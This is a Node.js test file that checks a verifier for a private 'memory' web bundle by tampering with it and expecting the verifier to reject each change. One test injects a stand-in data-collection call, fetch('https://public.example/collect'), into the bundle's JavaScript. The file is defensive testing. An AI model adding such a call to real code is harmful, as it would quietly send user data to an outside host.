"use strict";
const test=require("node:test"),assert=require("node:assert/strict");
const fs=require("node:fs"),os=require("node:os"),path=require("node:path");
const cp=require("node:child_process"),crypto=require("node:crypto");
const root=path.resolve(__dirname,"..");
const pack=path.join(root,"scripts/package-memory-v1.cjs");
const {verify}=require("../scripts/verify-memory-v1-bundle.cjs");
function bundle(){
 const dir=fs.mkdtempSync(path.join(os.tmpdir(),"memory-isolated-policy-"));
 const dest=path.join(dir,"private");
 const r=cp.spawnSync(process.execPath,[pack,"--out",dest],{encoding:"utf8"});
 assert.equal(r.status,0,r.stderr);
 return {dir,dest,cleanup:()=>fs.rmSync(dir,{recursive:true,force:true})};
}
function modifyWithNewHashes(dest,edits){
 const manifestPath=path.join(dest,"manifest.json");
 const manifest=JSON.parse(fs.readFileSync(manifestPath,"utf8"));
 for(const [name,content] of Object.entries(edits)){
   fs.writeFileSync(path.join(dest,name),content);
   const entry=manifest.files.find(x=>x.name===name);
   assert.ok(entry,"unknown bundle entry "+name);
   entry.sha256=crypto.createHash("sha256").update(Buffer.from(content)).digest("hex");
 }
 fs.writeFileSync(manifestPath,JSON.stringify(manifest,null,2)+"\n");
}
test("isolated candidate bundle has exact file allowlist, self-only scripts, no resources or transport",()=>{
 const v=bundle();
 try{
  const report=verify(v.dest);
  assert.equal(report.fileCount,7);
  assert.equal(report.independentOriginRequired,true);
  assert.equal(report.manifestStatus,"not-deployed");
  assert.equal(report.transportLint,"clear");
 }finally{v.cleanup();}
});
test("single-byte JS tampering invalidates the bundle hash",()=>{
 const v=bundle();
 try{
  fs.appendFileSync(path.join(v.dest,"memory.js"),"\n/* changed */\n");
  assert.throws(()=>verify(v.dest),/bundle_hash_mismatch_memory.js/);
 }finally{v.cleanup();}
});
test("extra public site page in private bundle must fail closed",()=>{
 const v=bundle();
 try{
  fs.writeFileSync(path.join(v.dest,"launcher.html"),"public content must not ship");
  assert.throws(()=>verify(v.dest),/unexpected_bundle_files/);
 }finally{v.cleanup();}
});
test("tampered manifest cannot declare a deployed host or suppress origin requirement",()=>{
 const v=bundle();
 try{
  const file=path.join(v.dest,"manifest.json");
  const data=JSON.parse(fs.readFileSync(file,"utf8"));
  data.status="deployed";data.requiresDedicatedOrigin=false;
  fs.writeFileSync(file,JSON.stringify(data,null,2));
  assert.throws(()=>verify(v.dest),/bundle_manifest_invalid/);
 }finally{v.cleanup();}
});
test("even recomputed hashes cannot allow public navigation or remote scripts",()=>{
 const v=bundle();
 try{
  const html=fs.readFileSync(path.join(v.dest,"memory.html"),"utf8");
  const tampered=html.replace("</header>",'<a href="https://public.example/launcher">public launcher</a></header>');
  modifyWithNewHashes(v.dest,{"memory.html":tampered,"index.html":tampered});
  assert.throws(()=>verify(v.dest),/unreviewed_navigation_or_resource/);
 }finally{v.cleanup();}
});
test("rehashed private bundle still rejects added fetch-based data transport",()=>{
 const v=bundle();
 try{
  const js=fs.readFileSync(path.join(v.dest,"memory.js"),"utf8");
  modifyWithNewHashes(v.dest,{"memory.js":js+"\nfetch('https://public.example/collect');\n"});
  assert.throws(()=>verify(v.dest),/unexpected_transport_in_memory.js/);
 }finally{v.cleanup();}
});
test("bundle manifest is integrity metadata only, not a signed identity attestation",()=>{
 const v=bundle();
 try{
  const m=JSON.parse(fs.readFileSync(path.join(v.dest,"manifest.json"),"utf8"));
  assert.equal(m.status,"not-deployed");
  assert.equal(m.requiresDedicatedOrigin,true);
  assert.ok(!Object.hasOwn(m,"signedBy")&&!Object.hasOwn(m,"approvedBy")&&!Object.hasOwn(m,"originUrl"));
 }finally{v.cleanup();}
});
